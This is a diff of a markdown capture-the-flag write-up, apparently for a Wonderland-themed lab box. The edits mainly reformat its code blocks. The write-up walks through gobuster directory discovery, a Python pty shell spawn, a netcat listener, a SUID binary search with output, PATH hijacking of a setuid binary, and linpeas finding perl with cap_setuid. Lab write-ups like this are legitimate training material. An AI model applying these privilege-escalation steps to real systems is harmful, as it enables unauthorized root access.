@@ -25,15 +25,21 @@ and " "That depends a good deal on where you want to get to," said the Cat." is 
 
 but it doesn't matter now, i put the gobuster to execute again but now in the /r/a/ and he found /b directory, looks like the alfabeth but it isn't in order  
 
-# Content: "I don’t much care where—" said Alice.
+Content:
+
+    "I don’t much care where—" said Alice.
 
 and gobuster found other /b directory inside /b directory, how confusing!
 
-# Content: "Then it doesn’t matter which way you go," said the Cat. 
+Content:     
+    
+    "Then it doesn’t matter which way you go," said the Cat. 
 
 now gobuster found /i 
 
-# Content: "—so long as I get somewhere,"" Alice added as an explanation.
+Content: 
+
+    "—so long as I get somewhere,"" Alice added as an explanation.
 
 all of these page has a "Keep going" in header so i mean that when i arrive in somewhere this will change
 
@@ -43,13 +49,15 @@ and the gobuster found /t and if you put all of these letter together, the resul
 
 and the header changes ! 
 
-# Content: Open the door and enter wonderland
+Content:
 
-"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."
+    Open the door and enter wonderland
 
-Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
+    "Oh, you’re sure to do that," said the Cat, "if you only walk long enough."
 
-"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
+    Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
+
+    "In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare.     Visit either you like: they’re both mad."
 
 so, if i add hatter or marchhare in the url? nothing happens :)
 
@@ -80,47 +88,40 @@ $ touch random.py
 $ nano random.py
 
 
-'''
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-'''
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 $ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
 $ nc -lvnp 9001
 
-i'll find for suid aplications and if i don't got anything i'm going to search something in contrab
-
+i'll search for suid aplications and if i don't got anything i'm going to search something in contrab
 
 $ find / -perm -4000 2>/dev/null
 
-'''
 
-/home/rabbit/teaParty 
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/openssh/ssh-keysign
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/usr/lib/eject/dmcrypt-get-device
-/usr/bin/chsh
-/usr/bin/newuidmap
-/usr/bin/traceroute6.iputils
-/usr/bin/chfn
-/usr/bin/passwd
-/usr/bin/gpasswd
-/usr/bin/newgrp
-/usr/bin/at 
-/usr/bin/newgidmap
-/usr/bin/pkexec
-/usr/bin/sudo
-/bin/fusermount
-/bin/umount
-/bin/ping
-/bin/mount
-/bin/su
-$ 
-
-'''
+    /home/rabbit/teaParty 
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    /usr/lib/policykit-1/polkit-agent-helper-1
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/bin/chsh
+    /usr/bin/newuidmap
+    /usr/bin/traceroute6.iputils
+    /usr/bin/chfn
+    /usr/bin/passwd
+    /usr/bin/gpasswd
+    /usr/bin/newgrp
+    /usr/bin/at 
+    /usr/bin/newgidmap
+    /usr/bin/pkexec
+    /usr/bin/sudo
+    /bin/fusermount
+    /bin/umount
+    /bin/ping
+    /bin/mount
+    /bin/su
+    $ 
 
 /home/rabbit/teaParty binary has suid, what this binary does?
 
@@ -143,32 +144,32 @@ $ /home/rabbit/teaParty
 $ whoami 
 hatter
 
-explanation from this blog: [blog](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/)
+explanation from this blog [here](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/)
 
-'''
-How does the PATH work exactly?
 
-The PATH variable is used to lookup executables when issuing command. It is composed of directories to include while searching, separated by a semicolon ‘:'.
 
-For example: /usr/local/bin:/usr/bin:/bin means that executables will be searched in the following directories:
+    How does the PATH work exactly?
+    
+    The PATH variable is used to lookup executables when issuing command. It is composed of directories to include while searching, separated by a semicolon ‘:'.
+    
+    For example: /usr/local/bin:/usr/bin:/bin means that executables will be searched in the following directories:
+    
+        /usr/local/bin
+        /usr/bin
+        /bin
+    
+    The search will stop when the executable is found. It means that if apt is present in /usr/local/bin/apt it will not be searched in the others    directories
 
-    /usr/local/bin
-    /usr/bin
-    /bin
-
-The search will stop when the executable is found. It means that if apt is present in /usr/local/bin/apt it will not be searched in the others directories.
-'''
 
 after a few time search something i decide use linpeas to enumerate for me and make the things more easy
 
-linpeas found this
+linpeas found this:
 
-'''
-Files with capabilities (limited to 50):
-/usr/bin/perl5.26.1 = cap_setuid+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/bin/perl = cap_setuid+ep
-'''
+    Files with capabilities (limited to 50):
+    /usr/bin/perl5.26.1 = cap_setuid+ep
+    /usr/bin/mtr-packet = cap_net_raw+ep
+    /usr/bin/perl = cap_setuid+ep
+
 
 so,just what you need to do is,but first connect in the hatter account with ssh...In my case this perl command only worked in this way
 
